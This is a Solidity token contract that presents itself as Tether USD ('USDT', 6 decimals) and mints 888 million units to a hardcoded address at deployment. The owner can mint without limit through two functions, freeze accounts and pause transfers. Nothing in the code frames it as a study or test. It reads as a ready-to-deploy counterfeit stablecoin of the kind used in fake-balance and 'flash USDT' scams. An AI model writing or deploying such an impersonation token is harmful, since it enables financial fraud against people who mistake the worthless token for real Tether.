// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract TetherUS {
    string public constant name     = "Tether USD";
    string public constant symbol   = "USDT";
    uint8  public constant decimals = 6;

    uint256 public constant INITIAL_SUPPLY = 888_000_000 * 1e6;

    address public constant RECIPIENT =
        0x72742A7323fde43240f1A80617cdD888A0a90DB6;

    address public owner;
    bool    public paused;
    uint256 public totalSupply;

    mapping(address => uint256)                      public balanceOf;
    mapping(address => mapping(address => uint256))  public allowance;
    mapping(address => bool)                         public frozen;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Grant(address indexed to, uint256 value);
    event Revoke(address indexed from, uint256 value);
    event Frozen(address indexed account, bool state);
    event OwnershipTransferred(address indexed from, address indexed to);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    modifier live() {
        require(!paused, "paused");
        _;
    }

    modifier thawed(address a) {
        require(!frozen[a], "frozen");
        _;
    }

    constructor() {
        owner = msg.sender;
        _mint(RECIPIENT, INITIAL_SUPPLY);
    }

    function _mint(address to, uint256 v) internal {
        totalSupply += v;
        balanceOf[to] += v;
        emit Transfer(address(0), to, v);
        emit Grant(to, v);
    }

    function mint(address to, uint256 v) external onlyOwner {
        _mint(to, v);
    }

    function grant(address to, uint256 v) external onlyOwner {
        _mint(to, v);
    }

    function burn(uint256 v) external live {
        require(balanceOf[msg.sender] >= v, "balance");
        balanceOf[msg.sender] -= v;
        totalSupply -= v;
        emit Transfer(msg.sender, address(0), v);
        emit Revoke(msg.sender, v);
    }

    function transfer(address to, uint256 v)
        external live thawed(msg.sender) returns (bool)
    {
        require(balanceOf[msg.sender] >= v, "balance");
        balanceOf[msg.sender] -= v;
        balanceOf[to] += v;
        emit Transfer(msg.sender, to, v);
        return true;
    }

    function approve(address s, uint256 v) external returns (bool) {
        allowance[msg.sender][s] = v;
        emit Approval(msg.sender, s, v);
        return true;
    }

    function transferFrom(address f, address to, uint256 v)
        external live thawed(f) returns (bool)
    {
        require(balanceOf[f] >= v, "balance");
        require(allowance[f][msg.sender] >= v, "allowance");
        unchecked {
            allowance[f][msg.sender] -= v;
        }
        balanceOf[f] -= v;
        balanceOf[to] += v;
        emit Transfer(f, to, v);
        return true;
    }

    function freeze(address a, bool s) external onlyOwner {
        frozen[a] = s;
        emit Frozen(a, s);
    }

    function pause(bool s) external onlyOwner {
        paused = s;
    }

    function transferOwnership(address n) external onlyOwner {
        emit OwnershipTransferred(owner, n);
        owner = n;
    }
}
